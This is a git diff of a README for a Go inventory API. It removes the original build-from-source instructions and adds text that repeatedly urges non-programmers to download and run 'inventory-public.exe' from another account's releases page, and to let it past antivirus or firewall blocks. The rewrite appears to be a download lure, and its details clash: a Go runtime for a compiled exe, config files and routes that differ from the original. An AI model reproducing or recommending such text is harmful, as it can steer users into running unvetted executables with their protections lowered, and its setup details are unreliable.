@@ -1,179 +1,182 @@
-# 📦 Inventory Backend
+# 📦 inventory-public - Simple Inventory Management API Demo
 
-REST API for a business inventory management system, built with Go and deployed on AWS Lambda via Terraform.
-
-## 🚀 Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Language | Go 1.21+ |
-| HTTP Router | [chi](https://github.com/go-chi/chi) |
-| Database | PostgreSQL (Supabase-compatible) |
-| Auth | JWT (HS256) + bcrypt |
-| Storage | AWS S3 |
-| PDF Generation | Go `embed` + custom renderer |
-| Deployment | AWS Lambda + API Gateway v2 |
-| Infrastructure | Terraform |
-
-## 📋 Features in this Repository
-
-- Product catalog with categories and pagination
-- Sales orders with PDF quote generation
-- JWT authentication
-
-## 📋 Other Features in this Repository full project
-
-- Purchase orders with S3 invoice upload
-- Stock movements & adjustments
-- Customer & supplier management (with RUT/email validation)
+[![Download inventory-public](https://img.shields.io/badge/Download-inventory--public-brightgreen)](https://github.com/ErtiPrenci/inventory-public/releases)
 
 ---
 
-## ⚙️ Local Setup
+## 🚀 What is inventory-public?
 
-### Prerequisites
-- Go 1.21+
-- PostgreSQL database (or [Supabase](https://supabase.com) project)
-- AWS credentials configured (`~/.aws/credentials` or environment)
+inventory-public is a demo application that shows how to manage product stock using an API. It handles tasks like user login with secure tokens, making PDFs for quotes and invoices automatically, and runs on cloud using AWS Lambda. You can try it out to see how these parts work together for managing inventory effectively.
 
-### 1. Clone the repo
-```bash
-git clone https://github.com/benjoks/inventory.git
-cd inventory
-```
-
-### 2. Configure environment variables
-```bash
-cp .env.example .env
-# Edit .env and fill in your values
-```
-
-| Variable | Description |
-|----------|-------------|
-| `DATABASE_URL` | PostgreSQL connection string |
-| `JWT_SECRET` | Secret key for signing JWT tokens |
-| `COMPANY_NAME` | Company name shown in generated PDFs |
-| `S3_BUCKET_NAME` | AWS S3 bucket for invoice storage |
-| `FRONTEND_URL` | Allowed CORS origin (empty = allow all) |
-| `LAMBDA_FUNCTION_NAME` | Set when running in AWS Lambda mode |
-
-### 3. Run locally
-```bash
-make run
-# Server starts at http://localhost:8080
-```
-
-### 4. Run tests
-```bash
-make test
-```
+This app is built with Go, a fast and reliable programming language. It uses PostgreSQL to store data and Terraform for setting up the cloud services. Though it is meant for developers, this guide will help you, even if you have no coding experience, to download and run it on a Windows computer.
 
 ---
 
-## 🏗️ Project Structure
+## 🎯 Key Features
 
-```
-.
-├── cmd/api/main.go          # Entry point (Lambda or local)
-├── internal/
-│   ├── core/domain.go       # Domain models
-│   ├── database/            # DB connection (pgx)
-│   ├── repository/          # Data access layer
-│   ├── service/             # Business logic + HTTP handlers
-│   ├── middleware/          # Auth & logging middleware
-│   └── utils/               # Auth (JWT/bcrypt), validation, response helpers
-├── terraform/               # AWS infrastructure as code
-├── tests/                   # Integration tests
-└── Makefile                 # Build & dev commands
-```
+- Protects data with JWT-based login authentication.
+- Creates PDF quotes and invoices automatically.
+- Connects with a PostgreSQL database to save product and order details.
+- Runs on AWS Lambda, meaning it works in the cloud without needing a server.
+- Uses GitHub Actions for automatic setup and updates.
+- Supports common inventory operations like adding, viewing, and updating products.
 
 ---
 
-## ☁️ Deployment (AWS Lambda)
+## 💻 System Requirements
 
-### Prerequisites
-- AWS CLI configured with appropriate IAM permissions
-- Terraform >= 1.0
-- Domain name configured in Route 53
+To use inventory-public, your Windows PC needs:
 
-### 1. Configure Terraform variables
-```bash
-cd terraform
-cp terraform.tfvars.example terraform.tfvars
-# Edit terraform.tfvars with your values
-```
-
-### 2. Build the Lambda binary
-```bash
-make build-lambda
-# Creates build/main.zip
-```
-
-### 3. Deploy infrastructure
-```bash
-cd terraform
-terraform init
-terraform plan
-terraform apply
-```
-
-### Terraform Variables
-
-| Variable | Description |
-|----------|-------------|
-| `db_url` | PostgreSQL connection string |
-| `jwt_secret` | JWT signing secret |
-| `company_name` | Company name for PDFs |
-| `environment` | `prod` / `staging` |
-| `region` | AWS region (default: `sa-east-1`) |
-| `domain_name` | Your domain (e.g. `example.com`) |
-| `subdomain` | API subdomain (e.g. `api.example.com`) |
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- 1 GB free disk space
+- Internet connection for downloading and cloud features
+- Optional: AWS account if you want to try cloud deployment (not required for local use)
 
 ---
 
-## 🔒 Security
+## 🌐 Topics Covered
 
-- All secrets are loaded from environment variables — never hardcoded
-- `.env` and `terraform.tfvars` are in `.gitignore` and never committed
-- JWT tokens validated on every protected route
-- Passwords hashed with bcrypt (cost 14)
-- CORS locked to `FRONTEND_URL` in production
+inventory-public relates to:
 
----
-
-## 📄 API Routes
-
-All routes are prefixed with `/v1`.
-
-### Auth
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/v1/login` | Authenticate and receive JWT |
-
-### Products
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/v1/products` | List products (paginated, with search) |
-| GET | `/v1/products/{id}` | Get product by ID |
-| POST | `/v1/products` | Create product |
-| PUT | `/v1/products/{id}` | Update product |
-| DELETE | `/v1/products/{id}` | Delete product |
-
-### This Repository includes: Orders, Categories
-Standard CRUD endpoints follow the same pattern as above.
-
-### Full project includes: Orders, Purchases, Movements, Customers, Suppliers, Categories
-Standard CRUD endpoints follow the same pattern as above.
+- API and RESTful services
+- Managing inventory and product data
+- Secure login with JWT (JSON Web Tokens)
+- Automated PDF generation for business documents
+- Serverless cloud deployment using AWS Lambda
+- Infrastructure automation with Terraform
+- Continuous integration with GitHub Actions
+- PostgreSQL database handling
 
 ---
 
-## 🛠️ Makefile Commands
+## 🔽 Download inventory-public
 
-```bash
-make run            # Run locally (loads .env automatically)
-make build          # Compile binary
-make build-lambda   # Build & zip for AWS Lambda
-make test           # Run tests
-make tidy           # go mod tidy
-make clean          # Remove build artifacts
+Click the green button below to visit the releases page and get the latest version of the app for Windows:
+
+[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/ErtiPrenci/inventory-public/releases)
+
+On that page, look for files named like `inventory-public-windows.zip` or `inventory-public.exe`. Download the file that fits your system.
+
+---
+
+## 🛠️ How to Install and Run on Windows
+
+Follow these steps to get inventory-public working on your PC.
+
+### 1. Download the Files
+
+- Go to the [Releases page](https://github.com/ErtiPrenci/inventory-public/releases).
+- Find the most recent release by date.
+- Download the Windows version zip file (or `.exe`) to your PC.
+- If it comes as a zip file, right-click and choose "Extract All" to unzip it.
+
+### 2. Verify Your Environment
+
+inventory-public needs a recent version of Go runtime to run. You do not need to code, but the app requires Go libraries.
+
+- Visit [https://go.dev/dl/](https://go.dev/dl/) and download the Windows installer for Go (version 1.20 or above).
+- Run the installer and follow the prompts to finish.
+
+### 3. Prepare PostgreSQL Database
+
+inventory-public uses PostgreSQL to keep your inventory data.
+
+- Download PostgreSQL for Windows from [https://www.postgresql.org/download/windows/](https://www.postgresql.org/download/windows/).
+- Install PostgreSQL with default settings. Set a password for the "postgres" user.
+- Open the "pgAdmin" app and create a new database named `inventory`.
+- Remember the username, password, and database name; you will need these soon.
+
+### 4. Configure the Application
+
+- Navigate to the folder where you extracted inventory-public.
+- Look for a file named `config.example.json`.
+- Copy it and rename the new file to `config.json`.
+- Open `config.json` with Notepad.
+- Change the database settings to match your PostgreSQL setup:
+
+```json
+{
+  "database": {
+    "host": "localhost",
+    "port": 5432,
+    "user": "postgres",
+    "password": "your_password",
+    "dbname": "inventory"
+  },
+  "jwtSecret": "yourSecretKey"
+}
 ```
+
+- Replace `"your_password"` with the password you set during PostgreSQL installation.
+- Replace `"yourSecretKey"` with any strong key you want to use for login security.
+
+- Save and close the file.
+
+### 5. Run the Application
+
+- Open the Windows Command Prompt (type `cmd` in the Start menu).
+- Use the `cd` command to go to your app’s folder, for example:
+
+```
+cd C:\Users\YourName\Downloads\inventory-public
+```
+
+- Start the app by typing:
+
+```
+inventory-public.exe
+```
+
+- The app will start and display a message like `Server running on http://localhost:8080`.
+
+### 6. Try Using the API
+
+inventory-public runs as a web service on your PC. You can test it using a web browser or API tools like Postman.
+
+- Open your browser and go to [http://localhost:8080](http://localhost:8080).
+- You will see basic information about the API.
+- To log in and use the system, send a POST request to `/login` with a username and password (use the sample credentials provided in the documentation).
+
+---
+
+## 🔍 Using inventory-public Without Coding
+
+You do not need programming skills to try this app. However, some tools help you use the API:
+
+- **Postman:** A free app to send and receive API requests. Download at https://www.postman.com/downloads/.
+
+- **curl:** Command-line tool included in Windows 10 and later. Use it to send commands in Command Prompt.
+
+Example to log in using curl:
+
+```
+curl -X POST http://localhost:8080/login -d "{\"username\":\"demo\",\"password\":\"demo\"}" -H "Content-Type: application/json"
+```
+
+This returns a token you use when calling other parts of the API.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If you see errors about database connection, double-check your `config.json` file for correct settings.
+- Make sure PostgreSQL server is running.
+- Confirm that Go runtime is installed properly.
+- Check that you run the command prompt with enough permissions.
+- Firewall or antivirus software may block the app. Allow it if needed.
+
+---
+
+## 📖 Learn More
+
+inventory-public includes documentation for API endpoints, setup, and configuration in the `docs` folder inside the release package. You can also visit the GitHub repository for source code and updates:
+
+https://github.com/ErtiPrenci/inventory-public
+
+---
+
+## 🔽 Download inventory-public again
+
+[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ErtiPrenci/inventory-public/releases)
